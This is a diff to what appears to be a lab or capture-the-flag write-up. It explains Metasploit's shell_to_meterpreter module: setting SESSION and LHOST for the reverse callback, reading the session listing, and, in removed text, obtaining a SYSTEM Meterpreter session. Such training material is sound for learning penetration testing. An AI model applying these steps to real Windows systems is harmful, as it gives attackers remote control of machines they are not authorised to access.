@@ -1029,13 +1029,19 @@ LHOST => 192.168.134.39
 msf post(multi/manage/shell_to_meterpreter) > 
 ```
 
-`Post module execution completed` prints before the session opens, and the console may need an Enter keypress before the new prompt shows — the module hands the callback to a separate handler that catches it a moment later. Running `run` twice opens a duplicate session; a spare Meterpreter session opened here and was removed with `sessions -k 3`. Session numbers are assigned dynamically and need not be sequential.
+**Breakdown of the session listing**
 
-The room's fallback note — re-run the previous task's exploit if this fails — applies because a converted session depends on the underlying shell still being healthy. If the shell has died, the conversion has nothing to push through.
+|Column|Value|Meaning|
+|---|---|---|
+|`Id`|1|The session identifier — the value passed to `set SESSION`.|
+|`Type`|`shell x64/windows`|A raw command shell on a 64-bit Windows target. The `shell` type is what this module upgrades.|
+|`Connection`|`192.168.134.39:4444 -> TARGET_IP:49269`|Attacker `tun0` address and handler port, to the target and its outbound source port.|
 
 **What this gives you**
 
-**Key finding: a Meterpreter session opened as SYSTEM (session 2), running entirely in memory, while the original shell (session 1) remains as a fallback.** The 248,902-byte stage is the full Meterpreter agent, against the 336-byte raw shell.
+The module is pointed at session 1 with a correct callback address. Both required-for-this-run values are set: `SESSION` and `LHOST`.
+
+Note that `LHOST` is technically marked optional by the module, but leaving it to auto-detect risks the same VPN-versus-virtualisation confusion seen in section 2.3. Setting it explicitly is the reliable choice.
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
